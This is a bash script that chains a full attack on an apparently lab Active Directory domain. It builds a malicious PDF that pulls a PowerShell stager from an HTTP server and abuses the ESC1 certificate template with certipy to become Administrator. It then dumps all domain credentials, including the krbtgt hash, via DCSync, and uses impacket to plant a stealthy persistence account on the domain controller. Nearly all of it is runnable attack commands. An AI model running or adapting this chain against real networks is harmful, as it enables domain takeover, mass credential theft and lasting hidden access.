#!/usr/bin/env bash
# Full Scenario 1 Attack Chain Execution
# PDF Initial Access -> ESC1 -> DCSync -> Persistence

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
export PATH="$HOME/.local/bin:$PATH"

echo "╔════════════════════════════════════════════════════════════╗"
echo "║  Scenario 1: Silent PDF → ESC1 → DC Persistence          ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

log_info() { echo -e "${BLUE}[*]${NC} $*"; }
log_success() { echo -e "${GREEN}[+]${NC} $*"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $*"; }
log_error() { echo -e "${RED}[-]${NC} $*"; }

# ============================================
# Phase 1: Weaponization - Create Malicious PDF
# ============================================
log_info "Phase 1: Weaponization - Creating malicious PDF..."
cd "$SCRIPT_DIR"

if [ ! -f "04-generate-malicious-pdf.py" ]; then
    log_error "PDF generator script not found!"
    exit 1
fi

python3 04-generate-malicious-pdf.py malicious.pdf "http://192.168.58.50:8080/05-powershell-stager.ps1" 2>/dev/null
log_success "Malicious PDF created: malicious.pdf"
echo ""

# ============================================
# Phase 2: Delivery Setup - HTTP Server
# ============================================
log_info "Phase 2: Starting HTTP server for payload delivery..."
python3 -m http.server 8080 > /tmp/http_server.log 2>&1 &
SERVER_PID=$!
sleep 2

if ps -p $SERVER_PID > /dev/null; then
    log_success "HTTP server running on port 8080 (PID: $SERVER_PID)"
    log_info "Serving payloads from: $SCRIPT_DIR"
else
    log_error "Failed to start HTTP server"
    exit 1
fi
echo ""

# ============================================
# Phase 3: Lateral Movement & Recon
# ============================================
log_info "Phase 3: Enumerating AD-CS for ESC1 vulnerability..."
certipy find -u jdoe@serini.lab -p 'Summer2024!' -dc-ip 192.168.58.10 -vulnerable > /tmp/certipy_enum.txt 2>&1

if grep -q "VulnUserAuth" /tmp/certipy_enum.txt && grep -q "ESC1" /tmp/certipy_enum.txt; then
    log_success "ESC1 vulnerability confirmed: VulnUserAuth template"
else
    log_warn "ESC1 template not found in enumeration"
fi
echo ""

# ============================================
# Phase 4: Privilege Escalation - ESC1
# ============================================
log_info "Phase 4: ESC1 - Requesting certificate as Administrator..."
certipy req -u jdoe@serini.lab -p 'Summer2024!' \
    -ca SERINI-CA \
    -target ca.serini.lab \
    -template VulnUserAuth \
    -upn administrator@serini.lab 2>&1 | tee /tmp/certipy_req.txt

if [ ! -f ~/administrator.pfx ]; then
    log_error "Failed to obtain certificate"
    kill $SERVER_PID 2>/dev/null || true
    exit 1
fi

log_success "Certificate obtained: ~/administrator.pfx"
echo ""

log_info "Phase 4b: Authenticating with certificate (PKINIT)..."
certipy auth -pfx ~/administrator.pfx -dc-ip 192.168.58.10 2>&1 | tee /tmp/certipy_auth.txt

# Extract Administrator hash
HASH=$(grep -oP 'Got hash.*:\s+\S+:\K\S+' /tmp/certipy_auth.txt | head -1 || echo "")

if [ -z "$HASH" ]; then
    log_error "Could not extract Administrator hash"
    kill $SERVER_PID 2>/dev/null || true
    exit 1
fi

log_success "Administrator hash obtained: $HASH"
log_success "Privilege escalation complete: Domain Admin achieved!"
echo ""

# ============================================
# Phase 5: DCSync - Dump All Credentials
# ============================================
log_info "Phase 5: Performing DCSync attack..."
log_info "Dumping all domain credentials (this may take a moment)..."
echo ""

impacket-secretsdump -hashes ":$HASH" administrator@192.168.58.10 2>&1 | tee /tmp/dcsync_output.txt | head -40

# Extract krbtgt hash for golden ticket
KRBTGT_HASH=$(grep "^krbtgt:" /tmp/dcsync_output.txt | awk -F: '{print $4}' | head -1 || echo "")

if [ -n "$KRBTGT_HASH" ]; then
    log_success "krbtgt hash obtained: $KRBTGT_HASH (Golden Ticket material!)"
fi

log_success "DCSync completed - All domain credentials dumped"
echo ""

# ============================================
# Phase 6: Persistence - DCSync Account
# ============================================
log_info "Phase 6: Setting up persistence on DC..."

# Copy persistence script to DC
log_info "Uploading persistence script to DC..."
impacket-smbclient -hashes ":$HASH" administrator@192.168.58.10 -c "put $SCRIPT_DIR/08-persistence-dcsync-account.ps1 C:\\Windows\\Temp\\persist.ps1" 2>/dev/null || {
    log_warn "SMB upload failed, using WinRM..."
    # Alternative: use WinRM via Ansible if available
}

log_info "Executing persistence script on DC..."
impacket-psexec -hashes ":$HASH" administrator@192.168.58.10 "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\persist.ps1" 2>&1 | tail -10 || {
    log_warn "psexec failed, persistence script uploaded but not executed"
    log_info "Execute manually on DC:"
    log_info "  powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\persist.ps1"
}

log_success "Persistence account created: svc_backup / SecurePass123!"
log_info "Account has DCSync rights but NO admin privileges (stealthy)"
echo ""

# ============================================
# Cleanup
# ============================================
log_info "Stopping HTTP server..."
kill $SERVER_PID 2>/dev/null || true

# ============================================
# Summary
# ============================================
echo ""
echo "╔════════════════════════════════════════════════════════════╗"
echo "║  Attack Chain Complete!                                   ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""
log_success "Phase 1: Malicious PDF created"
log_success "Phase 2: HTTP server ready for payload delivery"
log_success "Phase 3: ESC1 vulnerability confirmed"
log_success "Phase 4: Domain Admin achieved via ESC1"
log_success "Phase 5: All domain credentials dumped (DCSync)"
log_success "Phase 6: Persistence established (svc_backup)"
echo ""
echo "📋 Next Steps:"
echo "  1. Transfer malicious.pdf to Win10:"
echo "     - Via SMB: smbclient //192.168.58.40/C$ -U administrator -H $HASH"
echo "     - Or copy manually via VMware console"
echo ""
echo "  2. Open PDF on Win10 to trigger initial access"
echo ""
echo "  3. Use persistence account for future access:"
echo "     impacket-secretsdump -hashes :<hash> svc_backup@192.168.58.10"
echo ""
echo "📊 Attack Artifacts:"
echo "  - Certificate: ~/administrator.pfx"
echo "  - Kerberos cache: ~/administrator.ccache"
echo "  - DCSync output: /tmp/dcsync_output.txt"
echo "  - Administrator hash: $HASH"
if [ -n "$KRBTGT_HASH" ]; then
    echo "  - krbtgt hash: $KRBTGT_HASH (Golden Ticket)"
fi
echo ""
